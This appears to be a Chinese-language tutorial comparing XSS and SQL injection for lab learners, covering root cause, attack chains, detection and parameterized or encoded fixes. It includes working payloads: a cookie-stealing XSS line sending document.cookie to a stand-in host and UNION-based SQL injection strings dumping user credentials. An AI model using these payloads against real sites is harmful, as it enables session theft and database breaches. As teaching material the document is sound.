# XSS 与 SQL 注入 深度对比

> 学完这两块之后最容易产生的疑问：
>
> **它们长得完全不一样，为什么老师说是一类？**
>
> 这篇用"同一病根、不同宿主"的视角，把它们彻底对照一遍。

---

## 一、结论先行

> **XSS 和 SQL 注入是同一个病根，长在两个不同的器官上。**
>
> **病根：程序把"用户输入"和"代码"拼成了一句话。**
>
> **区别：XSS 的话说给浏览器听，SQL 注入的话说给数据库听。**

---

## 二、共性：同一病根

### 2.1 病根图

```
【正常】数据与代码分离

  程序：  SELECT * FROM users WHERE id = ?
  数据：  1

  两者互不干涉


【出事】数据与代码被拼成一句

  程序：  "SELECT * FROM users WHERE id='" + 输入 + "'"
  输入：  1' union select ... --+
  结果：  SELECT * FROM users WHERE id='1' union select ... --+ '

  ★ 输入越界，成了命令 ★
```

**XSS 完全同构：**

```javascript
// 程序
element.innerHTML = "<div>" + 输入 + "</div>"

// 输入
<img src=x onerror=alert(1)>

// 结果
<div><img src=x onerror=alert(1)></div>
```

### 2.2 四条共性

| # | 共性 | 说明 |
| --- | --- | --- |
| 1 | **都是注入** | 输入被当成代码执行 |
| 2 | **病根都是拼接** | 字符串拼接，没有边界 |
| 3 | **都依赖上下文** | XSS 看 HTML/JS 上下文；SQLi 看 SQL 上下文 |
| 4 | **防御同源** | 不拼接 + 按上下文处理 + 白名单 |

### 2.3 第 4 条最关键

| | XSS | SQL 注入 |
| --- | --- | --- |
| 根本手段 | 输出时按上下文编码 | 预编译（参数化查询） |
| 达到的效果 | 输入永远是"文本" | 输入永远是"数据" |
| 共同本质 | **把输入锁死在"值区"** | **把输入锁死在"值区"** |

### 2.4 同一个家族

| 漏洞 | 输入进入的地方 | 被谁解析 |
| --- | --- | --- |
| XSS | HTML / JS | 浏览器 |
| SQL 注入 | SQL 语句 | 数据库 |
| 命令注入 | shell 命令 | 操作系统 |
| 模板注入 (SSTI) | 模板表达式 | 模板引擎 |
| XXE | XML 实体 | XML 解析器 |
| 反序列化 | 序列化字符串 | 对象还原过程 |

**Pikachu 和 sqli-labs 里这些关，都是同一病根的六种长相。**

---

## 三、区别：宿主不同

### 3.1 注入点对照图

```
XSS：

  攻击者输入 → 进入网页 → ★ 受害者浏览器 ★ 解析执行
                                ↓
                    偷 cookie / 钓鱼 / 蠕虫传播


SQL 注入：

  攻击者输入 → 进入 SQL → ★ 数据库服务器 ★ 解析执行
                                ↓
                    脱库 / 改数据 / 删表
```

### 3.2 全维度对比表

| 维度 | XSS | SQL 注入 |
| --- | --- | --- |
| 注入到哪 | 网页（HTML/JS） | SQL 语句 |
| 谁执行 | **受害者的浏览器** | **数据库引擎** |
| 受害者 | **访问网站的用户** | **网站/公司** |
| 攻击语言 | HTML、JavaScript | SQL |
| 门槛 | 低（`alert(1)` 验证） | 中（要判断闭合、列数、回显位） |
| 典型危害 | 盗 cookie、钓鱼、蠕虫 | 脱库、改数据、删库 |
| 是否需回显 | 不需要（盲打） | 不一定（盲注） |
| 发现方式 | 看输入是否被原样输出 | 看报错 / 回显 / 响应时间 |
| 根本修复 | 输出编码 | 预编译 |
| 辅助防御 | CSP、HttpOnly | 最小权限、关闭报错 |

### 3.3 三个本质差异

#### 差异一：谁在受害

| | XSS | SQL 注入 |
| --- | --- | --- |
| 丢的是什么 | 用户的 cookie / 登录态 | 网站的数据库 |
| 谁承担损失 | 用户 | 公司 |

**SQL 注入像"把仓库搬空"，XSS 像"冒充店员骗顾客"。**

#### 差异二：代码在哪跑

| | XSS | SQL 注入 |
| --- | --- | --- |
| 执行环境 | 浏览器（客户端） | 数据库（服务端） |
| 攻击者控制的是 | 别人的浏览器 | 数据库的语句 |

**这决定了修复位置不同：**

- XSS 修在**输出时**（`htmlspecialchars`）
- SQL 注入修在**查询构造时**（`prepare`）

#### 差异三：门槛与收益

| | XSS | SQL 注入 |
| --- | --- | --- |
| 入门 | 一学就会 | 要先懂 SQL |
| 危害上限 | 控制管理员、蠕虫传播 | 整个数据库 |
| 现在的防护 | CSP 让利用变难 | 预编译让注入变难 |

## 四、攻击链逐步对照

### 4.1 XSS 的攻击链

```
第 1 步  找到输出点
         （输入被原样输出 / 被 innerHTML 拼接）

第 2 步  测试是否被转义
         输入 <b>test</b>，看页面是否变粗体

第 3 步  构造 payload
         <img src=x onerror=alert(1)>

第 4 步  验证执行
         弹窗出现

第 5 步  扩大危害
         偷 cookie / 钓鱼 / 键盘记录
```

### 4.2 SQL 注入的攻击链

```
第 1 步  找到注入点
         （URL 参数 / 表单 / Cookie / Header）

第 2 步  判断闭合方式
         ' 报错 → ' --+ 恢复 → 字符型
         ' 报错 → ' --+ 仍报错 → 数字型

第 3 步  数出列数
         order by N，报错为止

第 4 步  找回显位
         union select 1,2,3...

第 5 步  爆库 → 爆表 → 爆字段 → 爆数据

第 6 步  扩大危害
         登后台 / 写文件 / 提权
```

### 4.3 对照着看

| 阶段 | XSS | SQL 注入 |
| --- | --- | --- |
| 找点 | 找输出点 | 找传参点 |
| 试探 | 试 `<b>` 看是否转义 | 试 `'` 看是否报错 |
| 确认 | 弹窗 | 报错恢复 |
| 利用 | 注入 JS | 联合/盲注取数 |
| 扩大 | 偷 cookie | 登后台、写文件 |

**结构惊人地相似：都是"找点 → 试探 → 确认 → 利用 → 扩大"。**

## 五、payload 对照

### 5.1 XSS 的典型 payload

```html
<!-- 最基础 -->
<script>alert(1)</script>

<!-- innerHTML 场景 -->
<img src=x onerror=alert(1)>

<!-- 属性内 -->
' onmouseover='alert(1)

<!-- javascript 伪协议 -->
<a href="javascript:alert(1)">click</a>

<!-- 偷 cookie -->
<img src=x onerror="new Image().src='http://hack/c.php?c='+document.cookie">
```

### 5.2 SQL 注入的典型 payload

```sql
-- 判断闭合
?id=1'

-- 注释恢复
?id=1' --+

-- 数列数
?id=1' order by 3 --+

-- 找显位
?id=-1' union select 1,2,3 --+

-- 爆库
?id=-1' union select 1,database(),3 --+

-- 爆表
?id=-1' union select 1,group_concat(table_name),3
from information_schema.tables where table_schema=database() --+

-- 爆数据
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```

### 5.3 两种 payload 的"手感"对比

| | XSS | SQL 注入 |
| --- | --- | --- |
| 核心动作 | **闭合标签/属性** | **闭合引号** |
| 边界符 | `>` `'` `"` | `'` `"` `)` |
| 组合方式 | 插入新标签 | `union` 拼接新查询 |
| 成败关键 | 上下文对不对 | 列数对不对 |

**两者都在做同一件事：逃出"值"的范围，进入"代码"的区域。**

## 六、检测方法对照

### 6.1 XSS 的检测

| 方法 | 说明 |
| --- | --- |
| 输入特殊字符 | `<` `>` `"` `'` 看是否被编码 |
| 看页面源码 | `Ctrl+U` 搜你的输入 |
| 看 DOM | F12 看 innerHTML 结果 |
| 用 `alert(1)` | 最快确认 |
| 工具 | XSStrike、Burp 插件 |

### 6.2 SQL 注入的检测

| 方法 | 说明 |
| --- | --- |
| 加 `'` | 看是否报错 |
| 加 `' --+` | 看是否恢复 |
| `and 1=1` / `and 1=2` | 看响应差异 |
| `sleep(3)` | 看响应时间 |
| 工具 | sqlmap、Burp |

### 6.3 对照

| 信号 | XSS | SQL 注入 |
| --- | --- | --- |
| 强信号 | 弹窗 | 报错 |
| 弱信号 | 页面结构变化 | 响应长度/时间变化 |
| 无信号时 | 盲打 | 盲注 |

## 七、真实危害案例

### 7.1 XSS

| 案例 | 手法 | 后果 |
| --- | --- | --- |
| 微博蠕虫 | 存储型 XSS 自动转发 | 一夜刷屏 |
| 电商薅羊毛 | 偷用户 token | 批量下单 |
| 银行钓鱼 | 假登录框 | 骗走密码 |
| 后台被控 | 管理员中存储型 | 攻击者拿到后台 |

### 7.2 SQL 注入

| 案例 | 手法 | 后果 |
| --- | --- | --- |
| 用户库被拖 | `union select` 拖 users 表 | 千万账号泄露 |
| 数据被改 | `update` 注入 | 金额被篡改 |
| 数据库被删 | `drop table` | 业务停摆 |
| 服务器被控 | `into outfile` 写 shell | 直接 RCE |

### 7.3 危害对比

| | XSS | SQL 注入 |
| --- | --- | --- |
| 泄露范围 | 单个/部分用户 | 全库 |
| 是否可逆 | 改回页面即可 | 数据删了难恢复 |
| 传播性 | **强（蠕虫）** | 弱 |
| 直接损失 | 用户信任 | 业务数据 |

**XSS 传播快，SQL 注入损失大。**

## 八、修复代码完整对照

### 8.1 错误写法

**XSS：**

```php
echo "<div>" . $_GET['name'] . "</div>";
```

**SQL 注入：**

```php
$sql = "SELECT * FROM users WHERE id='" . $_GET['id'] . "'";
```

**两者的共同点：都在做字符串拼接。**

### 8.2 正确写法

**XSS（输出编码）：**

```php
echo "<div>" . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</div>";
```

**SQL 注入（预编译）：**

```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id=?");
$stmt->bind_param('s', $_GET['id']);
$stmt->execute();
```

### 8.3 为什么这两种修复"等价"

| | `htmlspecialchars` | `prepare` |
| --- | --- | --- |
| 做了什么 | 把 `<` 变成 `&lt;` | 把参数当纯数据 |
| 效果 | 浏览器不再当标签 | 数据库不再当语法 |
| 本质 | **取消输入的"代码资格"** | **取消输入的"代码资格"** |

**两者都不是"过滤坏字符"，而是"让输入失去变成代码的能力"。**

### 8.4 辅助防御对照

| 目标 | XSS | SQL 注入 |
| --- | --- | --- |
| 减少影响 | HttpOnly Cookie | 数据库最小权限 |
| 减少泄露 | CSP | 关闭 `display_errors` |
| 输入层兜底 | 长度/字符白名单 | `intval` 类型转换 |
| 监控 | CSP 报告 | SQL 审计日志 |

## 九、组合攻击

**真实渗透里，两种漏洞经常串起来用。**

### 9.1 XSS + CSRF

```
1. 存储型 XSS 让管理员浏览器执行 JS
2. JS 自动发请求（带管理员 cookie）
3. 服务端以为是管理员本人操作
4. 攻击者用管理员身份加了账号
```

**XSS 是"拿到执行权"，CSRF 是"借用身份"。**

### 9.2 SQL 注入 + 文件写入

```
1. SQL 注入拿到数据库权限
2. into outfile 写一个 .php 文件到网站目录
3. 访问那个文件 → RCE
```

**从"读数据"升级到"控制服务器"。**

### 9.3 XSS + SQL 注入（同一个输入点）

有些地方输入会同时进入页面和数据库：

```
留言板：
  输入 → 存进数据库（SQL 注入点）
       → 又显示在页面（XSS 点）
```

**一个输入，两个漏洞。**

## 十、常见误区

| 误区 | 纠正 |
| --- | --- |
| "XSS 就是弹窗，没什么危害" | 弹窗只是证明，真危害是盗号/钓鱼 |
| "SQL 注入只能读数据" | 还能写文件、删库、提权 |
| "过滤了 `<script>` 就安全了" | `<img onerror>` 一样能打 |
| "用了 `addslashes` 就防住注入了" | 宽字节注入能绕过（Less-32） |
| "前端校验就够了" | 前端校验等于没有 |
| "有 WAF 就打不了了" | 编码、变形、分块传输都能绕 |
| "内网系统不用管" | 内网横向移动更致命 |

## 十一、速查表

### 11.1 一页看完

| | XSS | SQL 注入 |
| --- | --- | --- |
| 病根 | 字符串拼接 | 字符串拼接 |
| 越界变成 | HTML/JS | SQL |
| 执行者 | 浏览器 | 数据库 |
| 受害者 | 用户 | 网站 |
| 边界符 | `>` `'` `"` | `'` `"` `)` |
| 判断 | 输入是否被原样输出 | 是否报错 / 回显变化 |
| 利用 | 注入 JS | union / 盲注 |
| 扩大 | 偷 cookie | 登后台、写文件 |
| 根本修复 | 输出编码 | 预编译 |
| 兜底 | CSP、HttpOnly | 最小权限、关报错 |

### 11.2 位置记忆法

```
用户输入
   ↓
┌─────────────┬─────────────┬─────────────┐
│   浏览器     │   数据库     │   系统命令   │
│    XSS      │  SQL 注入    │  命令注入    │
└─────────────┴─────────────┴─────────────┘
        ↑              ↑              ↑
    输出编码        预编译         参数转义
```

**学到新漏洞时，先问：这个输入最后被谁解析了？**

## 十二、学习路线

| 阶段 | 学什么 | 为什么 |
| --- | --- | --- |
| 1 | **XSS** | 门槛低，能直观看到"代码被执行" |
| 2 | **SQL 注入** | 需要 SQL 基础，套路固定 |
| 3 | **命令注入 / 文件包含** | 同一病根，换了位置 |
| 4 | **XXE / SSTI / 反序列化** | 更隐蔽的执行入口 |
| 5 | **组合与绕过** | WAF 绕过、链式利用 |

**核心只有一句话：**

> **凡是"用户输入被当作代码解析"的地方，就有注入。**

---

## 十三、总结

### 三句话记住全部

1. **病根一样**：数据被当成代码
2. **宿主不同**：浏览器 vs 数据库
3. **修复同源**：编码 / 预编译，让输入永远是数据

### 一句话

> **XSS 是"让浏览器执行我的话"，SQL 注入是"让数据库执行我的话"。**
>
> **同一句话，说给不同的对象听。**

### 更本质的一句

> **安全的第一原则：数据和代码，永远不要混在一起。**
